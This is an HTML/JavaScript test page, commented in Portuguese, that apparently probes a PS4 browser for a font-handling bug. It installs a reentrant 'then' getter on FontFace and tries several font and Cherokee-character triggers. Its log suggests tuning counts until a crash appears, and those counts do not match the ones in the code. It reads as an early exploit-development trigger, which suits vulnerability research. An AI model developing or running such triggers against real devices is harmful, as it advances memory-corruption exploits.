<!DOCTYPE html>
<html>
<head><meta charset="utf-8"></head>
<body>
<pre id="log"></pre>
<script>
// Variantes do Teste 1 — commit b4722e2
// Testando diferentes fontes locais disponiveis no PS4
// e diferentes caracteres de trigger

var out = document.getElementById('log');
function log(s) { out.textContent += s + '\n'; }

var ctx = null;
var inGetter = false;
var getterFired = false;

Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
        if (inGetter || !ctx)
            return undefined;
        inGetter = true;
        getterFired = true;
        for (var i = 0; i < 32; i++) {
            try { ctx.measureText('q' + String.fromCharCode(65 + i) + 'z'); } catch(e) {}
            try { ctx.measureText('x'); } catch(e) {}
        }
        inGetter = false;
        return undefined;
    }
});

function attempt(n, primaryFont, triggerText) {
    getterFired = false;

    for (var d = 0; d < 3; d++)
        new FontFace('Dummy' + n + '_' + d, 'local(' + primaryFont + ')');

    var family = 'VarFam' + n;
    var face = new FontFace(family, 'local(' + primaryFont + ')');
    void face.loaded;
    document.fonts.add(face);

    var canvas = document.createElement('canvas');
    canvas.width = 10;
    canvas.height = 10;
    ctx = canvas.getContext('2d');
    ctx.font = '20px ' + primaryFont + ', ' + family;

    for (var i = 0; i < 100; i++)
        ctx.measureText('x');

    ctx.measureText(triggerText);
    return getterFired;
}

function runVariant(label, primaryFont, triggerText, n) {
    log('--- ' + label + ' ---');
    log('    font: ' + primaryFont + '  trigger: "' + triggerText + '"');
    log('    [EXECUTANDO] <<<');
    var fired = false;
    try {
        fired = attempt(n, primaryFont, triggerText);
    } catch(e) {
        log('    EXCECAO: ' + e.message);
    }
    log('    PASSOU  |  getter disparou: ' + fired + '\n');
}

window.onload = function() {
    setTimeout(function() {

        // Variante 1 — Helvetica (original do commit)
        runVariant('V1: local(Helvetica) + AB', 'Helvetica', 'AB', 0);

        // Variante 2 — Times (possivelmente disponivel no PS4)
        runVariant('V2: local(Times) + AB', 'Times', 'AB', 1);

        // Variante 3 — Arial
        runVariant('V3: local(Arial) + AB', 'Arial', 'AB', 2);

        // Variante 4 — Helvetica mas com Cherokee como trigger
        // Cherokee ausente em Helvetica → forca lookup no fallback VarFam
        runVariant('V4: local(Helvetica) + Cherokee', 'Helvetica', '\u13A0\u13A2\u13A4', 3);

        // Variante 5 — Times com Cherokee
        runVariant('V5: local(Times) + Cherokee', 'Times', '\u13A0\u13A2\u13A4', 4);

        // Variante 6 — Arial com Cherokee
        runVariant('V6: local(Arial) + Cherokee', 'Arial', '\u13A0\u13A2\u13A4', 5);

        // Variante 7 — 'serif' (generic family)
        runVariant('V7: local(serif) + Cherokee', 'serif', '\u13A0\u13A2\u13A4', 6);

        log('=== FIM (sem crash nos testes acima hhhhh) ===');
        log('Se algum getter disparou mas sem crash: aumentar os 50 pre-calls ou 16 iteracoes.');
        log('Se nenhum getter disparou: fonte local nao encontrada ou outro bloqueio.');

    }, 0);
};
</script>
</body>
</html>
